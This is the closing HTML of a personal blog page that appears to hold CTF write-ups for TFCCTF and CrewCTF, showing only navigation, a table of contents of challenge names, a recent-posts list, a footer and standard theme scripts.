title="第四届山石CTF训练营"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Previous</div><div class="prev_info">第四届山石CTF训练营</div></div></a></div><div class="next-post pull-right"><a href="/2024/07/29/DeadSec-CTF2024/" title="DeadSec CTF2024"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Next</div><div class="next_info">DeadSec CTF2024</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/favicon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">HvAng</div><div class="author-info__description">Just keep learning</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">42</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/HvAng10"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is HvAng, a new star CTFer!</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#tfcctf"><span class="toc-number">1.</span> <span class="toc-text"> TFCCTF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web"><span class="toc-number">1.1.</span> <span class="toc-text"> Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#greetings"><span class="toc-number">1.1.1.</span> <span class="toc-text"> GREETINGS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#safe_content"><span class="toc-number">1.1.2.</span> <span class="toc-text"> SAFE_CONTENT</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#crypto"><span class="toc-number">1.2.</span> <span class="toc-text"> Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ccccc"><span class="toc-number">1.2.1.</span> <span class="toc-text"> CCCCC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#genetics"><span class="toc-number">1.2.2.</span> <span class="toc-text"> GENETICS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#conway"><span class="toc-number">1.2.3.</span> <span class="toc-text"> CONWAY</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#misc"><span class="toc-number">1.3.</span> <span class="toc-text"> Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#rules"><span class="toc-number">1.3.1.</span> <span class="toc-text"> RULES</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#discord-shenanigans-v4"><span class="toc-number">1.3.2.</span> <span class="toc-text"> DISCORD SHENANIGANS V4</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#crewctf"><span class="toc-number">2.</span> <span class="toc-text"> CrewCTF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web-2"><span class="toc-number">2.1.</span> <span class="toc-text"> Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#malkonkordo"><span class="toc-number">2.1.1.</span> <span class="toc-text"> Malkonkordo()</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#crypto-2"><span class="toc-number">2.2.</span> <span class="toc-text"> Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#4es"><span class="toc-number">2.2.1.</span> <span class="toc-text"> 4ES</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#read-between-the-lines"><span class="toc-number">2.2.2.</span> <span class="toc-text"> Read between the lines()</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#misc-2"><span class="toc-number">2.3.</span> <span class="toc-text"> Misc</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/03/31/DiceCTF2025-WriteUp/" title="DiceCTF2025-WriteUp">DiceCTF2025-WriteUp</a><time datetime="2025-03-30T17:38:57.000Z" title="Created 2025-03-31 01:38:57">2025-03-31</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/03/23/NCTF2024-WriteUp/" title="NCTF2024-WriteUp">NCTF2024-WriteUp</a><time datetime="2025-03-22T16:43:10.000Z" title="Created 2025-03-23 00:43:10">2025-03-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/03/22/NSSCTF-round28-2025%E7%BA%A2%E6%98%8E%E8%B0%B7%E6%9D%AF%E5%88%9D%E8%B5%9B/" title="NSSCTF Round#28 &amp;&amp; 2025红明谷杯初赛 WriteUps">NSSCTF Round#28 &amp;&amp; 2025红明谷杯初赛 WriteUps</a><time datetime="2025-03-22T08:57:18.000Z" title="Created 2025-03-22 16:57:18">2025-03-22</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/03/12/KalmarCTF2025-TPCTF2025-WriteUp/" title="KalmarCTF2025&amp;&amp;TPCTF2025-WriteUp">KalmarCTF2025&amp;&amp;TPCTF2025-WriteUp</a><time datetime="2025-03-12T05:12:21.000Z" title="Created 2025-03-12 13:12:21">2025-03-12</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/03/10/GHCTF2025-WriteUp/" title="GHCTF2025-WriteUp">GHCTF2025-WriteUp</a><time datetime="2025-03-09T18:00:00.000Z" title="Created 2025-03-10 02:00:00">2025-03-10</time></div></div></div></div></div></div></main><footer id="footer" style="background: transparent"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2025 By HvAng</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.12.0"></script><script src="/js/main.js?v=4.12.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>if (!window.MathJax) {
  window.MathJax = {
    tex: {
      inlineMath: [['$', '$'], ['\\(', '\\)']],
      tags: 'ams'
    },
    chtml: {
      scale: 1.1
    },
    options: {
      renderActions: {
        findScript: [10, doc => {
          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
            const display = !!node.type.match(/; *mode=display/)
            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
            const text = document.createTextNode('')
            node.parentNode.replaceChild(text, node)
            math.start = {node: text, delim: '', n: 0}
            math.end = {node: text, delim: '', n: 0}
            doc.math.push(math)
          }
        }, '']
      }
    }
  }
  
  const script = document.createElement('script')
  script.src = 'https://cdn.jsdelivr.net/npm/mathjax@3.2.2/es5/tex-mml-chtml.min.js'
  script.id = 'MathJax-script'
  script.async = true
  document.head.appendChild(script)
} else {
  MathJax.startup.document.state(0)
  MathJax.texReset()
  MathJax.typesetPromise()
}</script></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/fireworks.min.js"></script><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = true;
POWERMODE.mobile = false;
document.body.addEventListener('input', POWERMODE);
</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading the Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.12.0"></script></div></div></body></html>